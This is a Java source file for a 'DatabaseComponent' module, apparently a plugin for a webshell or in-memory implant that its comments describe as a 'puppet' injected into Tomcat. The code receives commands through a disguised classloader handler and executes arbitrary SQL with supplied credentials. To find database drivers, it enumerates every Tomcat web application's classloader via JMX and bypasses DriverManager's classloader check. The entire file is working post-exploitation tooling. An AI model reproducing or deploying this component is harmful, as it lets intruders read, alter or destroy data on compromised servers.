package org.leo.core.component;

import java.lang.reflect.Method;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Properties;
import java.util.Set;

/**
 * 数据库操作组件
 * 提供基础的JDBC数据库操作，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class DatabaseComponent implements Runnable {

    
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;


    /**
     * 组件执行入口
     */
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = copyStringObjectMap(h.invoke(null, null, null));
            results = new java.util.HashMap<String, Object>();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        String url = (String) params.get("jdbcUrl");
        String user = (String) params.get("username");
        String password = (String) params.get("password");
        String sql = (String) params.get("sql");
        String driver = (String) params.get("driverClass");

        // 参数校验，统一返回格式
        if (url == null || url.trim().isEmpty() || sql == null || sql.trim().isEmpty()) {
            results.put("code", 400);
            results.put("msg", "缺少必填参数: jdbcUrl 或 sql");
            results.put("columns", new ArrayList<HashMap<String, Object>>());
            results.put("rows", new ArrayList<HashMap<String, Object>>());
            results.put("rowCount", null);
            results.put("affectedRows", 0);
            results.put("generatedKey", null);
            return;
        }

        ArrayList<HashMap<String, Object>> columns = new ArrayList<HashMap<String, Object>>();
        ArrayList<HashMap<String, Object>> rows = new ArrayList<HashMap<String, Object>>();
        int updateCount = 0;
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;
        try {
            conn = openConnection(driver, url, user, password);
            stmt = conn.createStatement();
            boolean hasResult = stmt.execute(sql);
            if (hasResult) {
                rs = stmt.getResultSet();
                ResultSetMetaData metaData = rs.getMetaData();
                int columnCount = metaData.getColumnCount();
                for (int i = 1; i <= columnCount; i++) {
                    HashMap<String, Object> column = new HashMap<String, Object>();
                    column.put("name", metaData.getColumnName(i));
                    column.put("label", metaData.getColumnLabel(i));
                    column.put("type", metaData.getColumnTypeName(i));
                    column.put("nativeType", metaData.getColumnTypeName(i));
                    columns.add(column);
                }
                while (rs.next()) {
                    HashMap<String, Object> row = new HashMap<String, Object>();
                    for (int i = 1; i <= columnCount; i++) {
                        row.put(metaData.getColumnLabel(i), rs.getObject(i));
                    }
                    rows.add(row);
                }
            } else {
                updateCount = stmt.getUpdateCount();
            }
            results.put("columns", columns);
            results.put("rows", rows);
            results.put("rowCount", rows.size());
            results.put("affectedRows", updateCount);
            results.put("generatedKey", null);
            HashMap<String, Object> runtimeMetadata = new HashMap<String, Object>();
            runtimeMetadata.put("provider", "jdbc");
            runtimeMetadata.put("driver", driver);
            results.put("runtimeMetadata", runtimeMetadata);
            results.put("code", 200);
            results.put("msg", "执行成功");
        } catch (Exception ex) {
            results.put("code", 500);
            results.put("msg", ex.getMessage());
            throw ex;
        } finally {
            closeResource(rs, "ResultSet");
            closeResource(stmt, "Statement");
            closeResource(conn, "Connection");
        }
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(Object resource, String resourceName) {
        if (resource != null) {
            try {
                if (resource instanceof ResultSet) {
                    ((ResultSet) resource).close();
                } else if (resource instanceof Statement) {
                    ((Statement) resource).close();
                } else if (resource instanceof Connection) {
                    ((Connection) resource).close();
                }
            } catch (Exception e) {
                // 忽略关闭资源时的异常
            }
        }
    }

    // ==================== Driver 加载与 Connection 获取 ====================

    /**
     * 打开数据库连接。
     *
     * <p>DriverManager 的 SecurityManager 限制：它只允许由调用类同一 ClassLoader
     * 加载出来的 Driver。当 puppet 注入 Tomcat commonLoader、driver 却在 webapp
     * 的 WEB-INF/lib 里时，{@code Class.forName(driver)} 会失败。
     *
     * <p>本方法依次尝试：
     * <ol>
     *   <li>当前线程 contextClassLoader（puppet 自己的 CL）</li>
     *   <li>system ClassLoader</li>
     *   <li>所有 Tomcat WebappClassLoader（通过 JMX 查 {@code Catalina:j2eeType=WebModule,*}）</li>
     * </ol>
     * 找到 driver 类后通过无参构造器实例化，
     * 然后用 {@code Driver.connect(url, props)} 直连——绕开 DriverManager 的 CL 检查。
     */
    private Connection openConnection(String driver, String url, String user, String password) throws Exception {
        Class<?> driverClass = loadDriverClass(driver);
        if (driverClass == null) {
            throw new ClassNotFoundException(
                    "JDBC driver not found: " + driver
                    + "（已尝试 contextClassLoader / systemClassLoader / 所有 Tomcat WebappClassLoader）");
        }
        Object driverInstance = driverClass.getDeclaredConstructor().newInstance();

        // 直接用 Driver.connect(url, props) 而不是 DriverManager.getConnection()
        // —— DriverManager 会检查 Driver 是否由调用类的 CL 加载，跨 CL 会失败
        Properties props = new Properties();
        if (user != null) props.put("user", user);
        if (password != null) props.put("password", password);
        Connection conn = ((Driver) driverInstance).connect(url, props);
        if (conn == null) {
            throw new Exception("Driver.connect 返回 null（URL 协议可能与 Driver 不匹配）: " + url);
        }
        return conn;
    }

    /** 在多个 ClassLoader 里尝试加载 driver 类，返回第一个成功的。 */
    private Class<?> loadDriverClass(String driver) {
        // 1. 当前线程 contextClassLoader
        Class<?> c = tryLoad(Thread.currentThread().getContextClassLoader(), driver);
        if (c != null) return c;

        // 2. system ClassLoader
        c = tryLoad(ClassLoader.getSystemClassLoader(), driver);
        if (c != null) return c;

        // 3. 兜底：所有 Tomcat WebappClassLoader
        try {
            HashSet<ClassLoader> webappLoaders = collectWebappClassLoaders();
            Iterator<ClassLoader> iter = webappLoaders.iterator();
            while (iter.hasNext()) {
                ClassLoader cl = iter.next();
                c = tryLoad(cl, driver);
                if (c != null) return c;
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private Class<?> tryLoad(ClassLoader cl, String name) {
        if (cl == null) return null;
        try {
            return Class.forName(name, true, cl);
        } catch (Throwable t) {
            return null;
        }
    }

    /**
     * 通过 PlatformMBeanServer 找所有 Tomcat WebappClassLoader。
     * 复用 {@link ResourceComponent} 同款实现的简化版。
     */
    private HashSet<ClassLoader> collectWebappClassLoaders() throws Throwable {
        HashSet<ClassLoader> result = new HashSet<ClassLoader>();
        Class<?> mfClass = Class.forName("java.lang.management.ManagementFactory");
        Object mbs = mfClass.getMethod("getPlatformMBeanServer").invoke(null);
        Class<?> onClass = Class.forName("javax.management.ObjectName");
        Object pattern = onClass.getConstructor(String.class)
                .newInstance("Catalina:j2eeType=WebModule,*");
        Method queryNames = mbs.getClass().getMethod("queryNames", onClass,
                Class.forName("javax.management.QueryExp"));
        Object queriedNames = queryNames.invoke(mbs, pattern, null);
        if (!(queriedNames instanceof Set)) return result;
        Set<?> names = (Set<?>) queriedNames;
        if (names == null || names.isEmpty()) return result;
        Method getAttribute = mbs.getClass().getMethod("getAttribute", onClass, String.class);
        Iterator<?> iter = names.iterator();
        while (iter.hasNext()) {
            try {
                Object on = iter.next();
                Object ctx = getAttribute.invoke(mbs, on, "managedResource");
                if (ctx == null) continue;
                Method getLoader = ctx.getClass().getMethod("getLoader");
                Object loader = getLoader.invoke(ctx);
                if (loader == null) continue;
                Method getClassLoader = loader.getClass().getMethod("getClassLoader");
                Object cl = getClassLoader.invoke(loader);
                if (cl instanceof ClassLoader) {
                    result.add((ClassLoader) cl);
                }
            } catch (Throwable ignored) {
            }
        }
        return result;
    }

    private static HashMap<String, Object> copyStringObjectMap(Object value) {
        HashMap<String, Object> copy = new HashMap<String, Object>();
        if (!(value instanceof java.util.Map)) {
            return copy;
        }
        java.util.Map<?, ?> source = (java.util.Map<?, ?>) value;
        for (java.util.Map.Entry<?, ?> entry : source.entrySet()) {
            if (entry.getKey() instanceof String) {
                copy.put((String) entry.getKey(), entry.getValue());
            }
        }
        return copy;
    }
}
